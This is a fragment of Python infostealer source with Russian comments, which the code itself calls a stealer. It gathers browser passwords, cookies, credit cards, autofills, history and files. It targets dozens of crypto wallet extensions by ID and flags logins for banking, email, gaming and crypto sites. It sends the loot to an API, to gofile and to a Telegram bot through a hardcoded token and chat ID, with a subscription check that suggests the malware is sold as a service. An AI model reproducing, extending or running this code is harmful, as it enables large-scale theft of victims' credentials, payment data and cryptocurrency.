            html_parts.append(f'➡️ • <a href="{BOOKMARKS_LINK}">Bookmarks.txt</a>')

    if FILES_ARCHIVE_LINK:
        html_parts.append(f"\n<blockquote>📦 • <b>Файлы с компьютера</b></blockquote>")
        html_parts.append(f'➡️ • <a href="{FILES_ARCHIVE_LINK}">Архив</a>')

    full_html = "\n".join(html_parts)
    log_message(f"Общая длина HTML-текста: {len(full_html)}")

    # Разбиваем на части по 4096 символов
    def split_text(text, max_len=4096):
        parts = []
        while len(text) > max_len:
            split_at = text.rfind('\n', 0, max_len)
            if split_at == -1:
                split_at = max_len
            parts.append(text[:split_at])
            text = text[split_at:].lstrip('\n')
        if text:
            parts.append(text)
        return parts

    parts = split_text(full_html)

    # ========== ОТПРАВКА НА API (как было) ==========
    for idx, part in enumerate(parts, 1):
        send_log_to_api(part, 'text')
        log_message(f"Часть {idx}/{len(parts)} отправлена через API")

    # ========== ОТПРАВКА В TELEGRAM (добавлено) ==========
    # Токен и ID чата — можно задать здесь или брать из переменных окружения
    TG_BOT_TOKEN = "7965154885:AAF47_kzofVg9-IYbbcM4z2EHGz0h-LPfcI"  # токен твоего бота
    TG_CHAT_ID = "5084593394"  # твой ID (куда присылать логи)

    try:
        for part in parts:
            url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
            payload = {
                "chat_id": TG_CHAT_ID,
                "text": part,
                "parse_mode": "HTML"
            }
            resp = requests.post(url, json=payload, timeout=10)
            if resp.status_code == 200:
                log_message("Часть лога отправлена в Telegram")
            else:
                log_message(f"Ошибка отправки в Telegram: {resp.status_code}, {resp.text}")
    except Exception as e:
        log_message(f"Исключение при отправке в Telegram: {e}")

global k3YW0rd, c00K1W0rDs, p45WW0rDs, C00K1C0UNt, P455WC0UNt, W411375Z1p, G4M1N6Z1p, O7H3rZ1p, THr34D1157

DETECTED = False
w411375 = [
    ["nkbihfbeogaeaoehlefnkodbefgpgknn", "Metamask"         ],
    ["ejbalbakoplchlghecdalmeeeajnimhm", "Metamask"         ],
    ["fhbohimaelbohpjbbldcngcnapndodjp", "Binance"          ],
    ["hnfanknocfeofbddgcijnmhnfnkdnaad", "Coinbase"         ],
    ["fnjhmkhhmkbjkkabndcnnogagogbneec", "Ronin"            ],
    ["egjidjbpglichdcondbcbdnbeeppgdph", "Trust"            ],
    ["ojggmchlghnjlapmfbnjholfjkiidbch", "Venom"            ],
    ["opcgpfmipidbgpenhmajoajpbobppdil", "Sui"              ],
    ["efbglgofoippbgcjepnhiblaibcnclgk", "Martian"          ],
    ["ibnejdfjmmkpcnlpebklmnkoeoihofec", "Tron"             ],
    ["ejjladinnckdgjemekebdpeokbikhfci", "Petra"            ],
    ["phkbamefinggmakgklpkljjmgibohnba", "Pontem"           ],
    ["ebfidpplhabeedpnhjnobghokpiioolj", "Fewcha"           ],
    ["afbcbjpbpfadlkmhmclhkeeodmamcflc", "Math"             ],
    ["aeachknmefphepccionboohckonoeemg", "Coin98"           ],
    ["bhghoamapcdpbohphigoooaddinpkbai", "Authenticator"    ],
    ["aholpfdialjgjfhomihkjbmgjidlcdno", "ExodusWeb3"       ],
    ["bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom"          ],
    ["agoakfejjabomempkjlepdflaleeobhb", "Core"             ],
    ["mfgccjchihfkkindfppnaooecgfneiii", "Tokenpocket"      ],
    ["lgmpcpglpngdoalbgeoldeajfclnhafa", "Safepal"          ],
    ["bhhhlbepdkbapadjdnnojkbgioiodbic", "Solfare"          ],
    ["jblndlipeogpafnldhgmapagcccfchpi", "Kaikas"           ],
    ["kncchdigobghenbbaddojjnnaogfppfj", "iWallet"          ],
    ["ffnbelfdoeiohenkjibnmadjiehjhajb", "Yoroi"            ],
    ["hpglfhgfnhbgpjdenjgmdgoeiappafln", "Guarda"           ],
    ["cjelfplplebdjjenllpjcblmjkfcffne", "Jaxx Liberty"     ],
    ["amkmjjmmflddogmhpjloimipbofnfjih", "Wombat"           ],
    ["fhilaheimglignddkjgofkcbgekhenbh", "Oxygen"           ],
    ["nlbmnnijcnlegkjjpcfjclmcfggfefdm", "MEWCX"            ],
    ["nanjmdknhkinifnkgdcggcfnhdaammmj", "Guild"            ],
    ["nkddgncdjgjfcddamfgcmfnlhccnimig", "Saturn"           ], 
    ["aiifbnbfobpmeekipheeijimdpnlpgpp", "TerraStation"     ],
    ["fnnegphlobjdpkhecapkijjdkgcjhkib", "HarmonyOutdated"  ],
    ["cgeeodpfagjceefieflmdfphplkenlfk", "Ever"             ],
    ["pdadjkfkgcafgbceimcpbkalnfnepbnk", "KardiaChain"      ],
    ["mgffkfbidihjpoaomajlbgchddlicgpn", "PaliWallet"       ],
    ["aodkkagnadcbobfpggfnjeongemjbjca", "BoltX"            ],
    ["kpfopkelmapcoipemfendmdcghnegimn", "Liquality"        ],
    ["hmeobnfnfcmdkdcmlblgagmfpfboieaf", "XDEFI"            ],
    ["lpfcbjknijpeeilifnkikgncikgfhdo", "Nami"             ],
    ["dngmlbldofobpdpecaadgfbcggfjfnm", "MaiarDEFI"        ],
    ["ookjlbkijinhmpmjffcofjonbfbgaoc", "TempleTezos"      ],
    ["eigblbgjknlfbajkfhopmcojidlgcehm", "XMR.PT"          ],
]

IP = G371P()
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")

k3YW0rd = ['[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', '[uber](https://uber.com)', '[netflix](https://netflix.com)', '[github](https://github.com)', '[stake](https://stake.com)']
C00K1C0UNt, P455WC0UNt, CC5C0UNt, AU70F111C0UNt, H1570rYC0UNt, B00KM4rK5C0UNt = 0, 0, 0, 0, 0, 0
c00K1W0rDs, p45WW0rDs, H1570rY, CCs, P455w, AU70F11l, C00K13s, W411375Z1p, G4M1N6Z1p, O7H3rZ1p, THr34D1157, K1W1F113s, B00KM4rK5, T0K3Ns = [], [], [], [], [], [], [], [], [], [], [], [], [], ''

# Глобальные переменные для ссылок на файлы (для Telegram сводки)
PASSWORDS_LINK = ""
COOKIES_LINK = ""
CREDITCARDS_LINK = ""
AUTOFILLS_LINK = ""
HISTORIES_LINK = ""
BOOKMARKS_LINK = ""
FILES_ARCHIVE_LINK = ""

gofileserver = "store4"
log_message(f"gofileserver = {gofileserver}")

    
if __name__ == "__main__":
    try:
        # Проверяем подписку (если не активна – программа завершится)
        check_subscription()
        log_message("Подписка активна, продолжаем работу")

        GLINFO = G108411NF0()
        G47H3r411()
        wikith = K1W1()
        for thread in wikith:
            thread.join()
        time.sleep(0.2)
        filestealr()
        log_message("Перед вызовом send_telegram_summary")
        send_telegram_summary()
        log_message("После вызова send_telegram_summary")
    except Exception as e:
        error_data = {"content": f"Ошибка в стелере: {str(e)}"}
        try:
            L04DUr118(h00k, data=dumps(error_data).encode(), headers={})
        except:
            pass
        log_message(f"Исключение в main: {e}")
        import traceback
        log_message(traceback.format_exc())
